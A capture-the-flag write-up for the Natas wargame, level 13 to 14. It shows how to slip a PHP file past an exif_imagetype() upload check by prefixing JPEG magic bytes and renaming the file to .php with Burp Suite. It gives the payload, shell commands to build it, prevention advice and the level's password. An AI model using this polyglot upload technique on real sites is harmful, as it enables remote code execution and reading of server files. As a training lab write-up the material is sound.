# Natas Level 13 → 14

## Objective

Retrieve the password for the next level by exploiting an insecure file upload implementation that validates only the file's image signature while still allowing execution of uploaded PHP files.

---

## Enumeration

- Reviewed the webpage source code.
- Compared the upload logic with the previous level.
- Identified that the server now validates uploaded files using `exif_imagetype()`.
- Observed that the filename is still controlled by a hidden form field.
- Determined that the upload directory continues to execute PHP files.

---

## Source Code Analysis

The upload form still contains a hidden filename field:

```html
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
```

The upload path is generated using:

```php
$target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
```

The uploaded file is validated before being stored:

```php
if (filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
    echo "File is too big";
}
else if (!exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
    echo "File is not an image";
}
else {
    move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path);
}
```

The new protection is:

```php
exif_imagetype($_FILES['uploadedfile']['tmp_name'])
```

This function checks the **magic bytes** (file signature) of the uploaded file to determine whether it is a valid image.

---

## Observation

Unlike the previous level, simply uploading a PHP file is no longer sufficient.

A PHP file begins with:

```php
<?php
```

which does not match any valid image signature.

As a result:

```php
exif_imagetype()
```

returns:

```text
false
```

and the upload is rejected.

However, the server only verifies the **first few bytes** of the file.

It does **not** inspect the remainder of the file.

---

## Vulnerability

### Magic Byte Bypass

JPEG files begin with the following magic bytes:

```text
FF D8 FF E0
```

If these bytes are placed at the beginning of a PHP file, `exif_imagetype()` identifies the file as a JPEG image.

The remainder of the file can still contain valid PHP code.

Since the upload directory executes `.php` files, the embedded PHP code is interpreted by the web server.

This results in **Remote Code Execution (RCE).**

---

# Request Analysis

## Original Request

The browser submits:

```http
Content-Disposition: form-data; name="filename"

abcd1234.jpg
```

The uploaded file is checked using:

```php
exif_imagetype()
```

before being stored.

---

## Modified Request (Burp Suite)

Intercept the request using Burp Suite and change:

```http
Content-Disposition: form-data; name="filename"

abcd1234.jpg
```

↓

```http
Content-Disposition: form-data; name="filename"

shell.php
```

The uploaded payload now satisfies both conditions:

- Valid JPEG signature
- PHP extension

---

## Exploitation

### Step 1 - Create the Payload

Create a file beginning with JPEG magic bytes followed by PHP code.

**shell.php**

```php
\xFF\xD8\xFF\xE0<?php
echo file_get_contents('/etc/natas_webpass/natas14');
?>
```

> While creating the file, the first four bytes must be the **actual hexadecimal bytes**, not the literal text `\xFF`.

Example (Linux):

```bash
printf '\xFF\xD8\xFF\xE0' > shell.php
cat >> shell.php <<'EOF'
<?php
echo file_get_contents('/etc/natas_webpass/natas14');
?>
EOF
```

Verify:

```bash
xxd shell.php
```

Expected output:

```text
00000000: ffd8 ffe0 3c3f 7068 70...
```

---

### Step 2 - Select the Payload

Choose:

```text
shell.php
```

for upload.

---

### Step 3 - Intercept the Request

Using Burp Suite:

```
Proxy
    ↓
Intercept
    ↓
Capture Upload Request
```

---

### Step 4 - Modify the Hidden Filename

Original:

```text
filename = abcd1234.jpg
```

↓

Modified:

```text
filename = shell.php
```

---

### Step 5 - Forward the Request

Forward the modified request.

The server performs:

1. File size check ✅
2. `exif_imagetype()` check ✅
3. Stores the file as:

```text
upload/randomname.php
```

---

### Step 6 - Execute the Uploaded File

Visit:

```text
upload/randomname.php
```

The PHP payload executes:

```php
<?php
echo file_get_contents('/etc/natas_webpass/natas14');
?>
```

↓

The contents of:

```text
/etc/natas_webpass/natas14
```

are displayed.

---

## Attack Flow

```
Create Polyglot File
(JPEG Magic Bytes + PHP)
            │
            ▼
Select File
            │
            ▼
Intercept Upload Request
            │
            ▼
Modify Hidden Filename
(.jpg → .php)
            │
            ▼
Forward Request
            │
            ▼
Server Accepts File
as Valid JPEG
            │
            ▼
Stores File as .php
            │
            ▼
Open Uploaded File
            │
            ▼
PHP Executes
            │
            ▼
Read Password File
            │
            ▼
Reveal Password
```

---

## Result

The server successfully validated the file as an image because of the JPEG magic bytes while simultaneously storing it with a `.php` extension.

Visiting the uploaded file executed the embedded PHP code and revealed the password for **Natas Level 14**.

---

## Prevention

- Validate both the file signature and MIME type.
- Re-encode uploaded images instead of storing user-supplied files directly.
- Never execute files from upload directories.
- Store uploaded files outside the web root.
- Ignore client-controlled filenames.
- Restrict upload directories using web server configuration (e.g., disable PHP execution).

---

## Key Takeaways

- Magic bytes identify a file's format but do not guarantee its safety.
- `exif_imagetype()` alone is insufficient to secure file uploads.
- Polyglot files can satisfy multiple formats simultaneously.
- Upload directories should never execute uploaded files.
- Defense-in-depth is essential for secure file upload implementations.

---

<details>
<summary><strong>🔑 Password (Spoiler)</strong></summary>

```text
Username : natas14
Password : A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
```

</details>